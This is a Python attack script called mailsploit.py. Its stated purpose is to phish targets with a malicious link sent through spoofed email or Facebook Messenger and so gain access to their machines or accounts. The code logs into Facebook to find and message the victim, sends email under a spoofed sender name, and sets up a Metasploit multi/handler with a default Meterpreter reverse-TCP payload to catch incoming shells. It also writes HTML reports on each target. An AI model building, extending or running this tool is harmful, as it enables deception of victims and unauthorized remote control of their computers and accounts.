#!/usr/bin/python
#############################################################
#
# Title: mailsploit.py
# Author: Th3J0k3r
#
# Purpose: to be able to send a malicious link via email or 
# facebook to gain access to someones machine or account.
#
############################################################
import socket
import yagmail
import smtplib
import ConfigParser
import mimetypes
import email
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.utils import COMMASPACE,formatdate
import time
import os
from lazyme.string import color_print
import string
from fbchat import Client
from fbchat.models import *
from fbchat import log, Client


#
# Prints a banner.
#
def banner ():

	os.system("clear")
	color_print(
"""


'||\   /||`              '||`    .|'''|          '||`               ||   
 ||\\.//||           ''   ||     ||               ||          ''    ||   
 ||     ||   '''|.   ||   ||     `|'''|, '||''|,  ||  .|''|,  ||  ''||'' 
 ||     ||  .|''||   ||   ||      .   ||  ||  ||  ||  ||  ||  ||    ||   
.||     ||. `|..||. .||. .||.     |...|'  ||..|' .||. `|..|' .||.   `|..'
                                          ||                             
                                         .||                             
                                               
				   v1.1                                                                        
""", color='red')


#
# Sets up the configuration file.
#
def setup ():

	# Setup the config file
	global targetEmail
	global spoofName
	global email
	global password
	global subject
	global message
	global emailImage
	global fbusername
	global fbpassword
	global fbmessage
	global fbuser
	global fbuserID

	configParser = ConfigParser.RawConfigParser()	
	configParser.read('config')
	targetEmail = configParser.get('Config', 'targetEmail')
	spoofName  = configParser.get('Config', 'spoofName')
	email    = configParser.get('Config', 'email')
	password = configParser.get('Config', 'password')
	subject = configParser.get('Config', 'subject')
	message = configParser.get('Config', 'message')
	fbuser = configParser.get('Config', 'fbuser')
	fbusername = configParser.get('Config', 'fbusername')
	fbpassword = configParser.get('Config', 'fbpassword')
	fbmessage = configParser.get('Config', 'fbmessage')
	fbuserID = configParser.get('Config', 'fbuserID')

	if len(message) >= 10:
		
		fb = raw_input("Did you want to send to facebook messenger: [Y/n] ")
		if fb == 'No' or fb == 'n' or fb == 'no':
				

			global isUsingMessenger

			# Validate the input.
			if (spoofName == 'None' or email == 'None' or password == 'None' or targetEmail == 'None'):
				color_print('[!] Please setup your config file for mail attacks.', color='red')	
				return
			else:
				# Connects to the server.
				isUsingMessenger = False
				connect()
		else:
			# Validate the input.
			if (fbusername == 'None' or fbpassword == 'None' or fbmessage == 'None' or fbuserID == 'None'):
				color_print('[!] Please setup your config file for facebook messenger attacks', color='red')	
				return
			else:
				isUsingMessenger = True
				sendToMessenger()

#
# Sends a malicious message through to FB Messenger.
#
def sendToMessenger():

	client = Client(fbusername, fbpassword)
	color_print("[+] Logged in to " + fbusername, color='green')
	# `searchForUsers` searches for the user and gives us a list of the results,
	# and then we just take the first one, aka. the most likely one:
	color_print("[+] Searching for user " + fbuser, color='blue')
	global user
	try:
		user = client.searchForUsers(fbuser)[0]
		
		if user.name == fbuser:
			

			color_print("[+] Found user " + user.name, color='green')
			time.sleep(2)
			
			print('user ID: {}'.format(user.uid))
			print("user's name: {}".format(user.name))
			print("user's photo: {}".format(user.photo))
			print("Is user client's friend: {}".format(user.is_friend))
			
			send = raw_input("Do you want to send the malicious message: [Y/n] ")
			if (send == 'Y' or send == 'Yes' or send == 'yes' or send == 'y'):

				try:
					color_print("[+] Sending malicious message to facebook messenger", color='blue')
					# Will send a message to the thread
					global link
					link = getLink()
					client.send(Message(text=fbmessage + "\n" + link), thread_id=fbuserID, thread_type=ThreadType.USER)
					color_print("[+] Message Sent. ", color='blue')
					listenForConnections()
				except FBchatFacebookError:
					color_print("[!] There might be a problem try making sure the facebook ID is correct", color='red')
			
		else:
			color_print("[!] No User found", color='red')
			return
	except IndexError:
		color_print("[!] Something bad happended :(", color='red')
		return
#
# Connects to the smtp server.
#
def connect():

	# get the smtp server via user input.
	color_print("[+] Getting everything ready.", color='blue')
		
	# attempt to connect to the stmp server.
	try:
		# Connecting to the server.
		try:
			# Create the yagmail object
			yag = yagmail.SMTP({email:spoofName}, password)

			try:
				# Send the mail.
				sendEmail(yag, email, targetEmail, spoofName, subject, message)
			except KeyboardInterrupt:
				color_print("Thanks, Happy hacking", color='blue')
		
			#color_print("[+] Connected.", color='green')

		except smtplib.SMTPServerDisconnected:
			color_print("[!] Connection unexpectedly closed, \n[!] you might be behind a firewall! Try using a VPN.", color='red')
			return

	except socket.gaierror:
		# Failed to connect!!.
		color_print("\n[!] Could not connect to the server.", color='red')
		return

#
# Grabs the malicious link
#
def getLink ():
	# Tell the user to upload there file.
	color_print("Upload it to a free file hosting website: https://nofile.io/", color='yellow')
	color_print("OR Paste in the IP Address of your malicious server", color='yellow')
	time.sleep(2)
	link = raw_input("\nPaste the link to your file: \n")		
	while len(link) == 0: link = raw_input("Paste the link to your file: ")
	return link


#
# Sends a malicious email
#
def sendEmail (server, fromAddr, toAddr, spoofName, subject, message):

	# Get the link
	link = getLink()
	# Create the specially crafted link.
	html = '<a href="'+link+'">'+link+'</a>'


	# Print out a thew important messages.
	color_print("[+] Sending email to " + toAddr, color='blue')
	time.sleep(2)
	color_print("[+] Spoofing email " + spoofName, color='yellow')
	time.sleep(2)
	color_print("[*] Sending malicious link..", color='yellow')
	time.sleep(1)

	# Send the message.
	server.send(fromAddr, subject, [message, html])
	color_print("\n[*] Email sent", color='green')

	listenForConnections()
	

#
# Listen for a connection
#		
def listenForConnections ():
# Do you want to listen for any connections.
	listen = raw_input('Do you want to start up a listener: [Y/N]: ')
	if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
		color_print("[+] Starting a listener", color='blue')

		# Listen for a connection

		lhost = raw_input('What is your LHOST (local ip address): ')
		lport = raw_input('What is your LPORT (port): ')
		payload = raw_input('What is your payload: (eg windows/meterpreter/reverse_tcp): ')
		if payload == '':
			payload = 'windows/meterpreter/reverse_tcp'

		if os.path.isfile('resource.rc'):
			os.system('rm resource.rc')
		os.system('touch resource.rc')
		os.system('echo use exploit/multi/handler >> resource.rc')
		os.system('echo set PAYLOAD ' + payload + ' >> resource.rc')
		os.system('echo set LHOST ' + lhost + ' >> resource.rc') 
		os.system('echo set LPORT ' + lport + ' >> resource.rc')
		os.system('echo set ExitOnSession false >> resource.rc')
		os.system('echo exploit -j -z >> resource.rc')
		os.system('cat resource.rc')
		os.system('msfconsole -r resource.rc')
	else:
		color_print("[+] Generated a report..", color='green')
		if isUsingMessenger == False:
			generateMailReport(fromAddr, toAddr, spoofName, subject, message, html)
		else:
			generateMessengerReport(fbuser, fbuserID, fbmessage, link)
		color_print("\nThanks, Happy hacking", color='blue')
		return	


# Generate a html report
def generateMessengerReport(fbuser, fbuserID, message, link):		
		f = open("reports/" + fbuser + ".html", "w")
		f.write("""
<!DOCTYPE html>
<html>
<div style="display: flex; justify-content: center;">
  <img src='"""+user.photo+"""' style="width: 40px; height: 40px;" />
</div>
<body style="background-color:white;">
<title> MailSpoof Report </title>
<table style="width:100%">
  <tr>
    <th>User</th>
    <th>ID</th> 
    <th>Message</th>
    <th>Link</th>
  </tr>
  <tr>
    <td>""" + str(fbuser) +"""</td>
    <td>""" + str(fbuserID) +"""</td>
    <td>""" + str(message) +"""</td>
    <td><a href='""" + str(link) + """'>"""+link+"""</a></td>
  </tr>
</table>
</html>""")
		f.close()	

# Generate a html report
def generateMailReport(fromemail, toemail, spoofemail, subject, message, link):		
		f = open("reports/" + toemail + ".html", "w")
		f.write("""
<!DOCTYPE html>
<html>
<body style="background-color:white;">
<title> MailSpoof Report </title>
<table style="width:100%">
  <tr>
    <th>From Email</th>
    <th>To Email</th> 
    <th>Spoofed Email</th>
    <th>Subject</th>
    <th>Message</th>
    <th>Link</th>
  </tr>
  <tr>
    <td>""" + str(fromemail) +"""</td>
    <td>""" + str(toemail) +"""</td>
    <td>""" + str(spoofemail) +"""</td>
    <td>""" + str(subject) +"""</td>
    <td>""" + str(message) +"""</td>
    <td>""" + str(link) + """</td>
  </tr>
</table>
</html>""")
		f.close()
	

#### Call the methods ####
banner()
setup()		
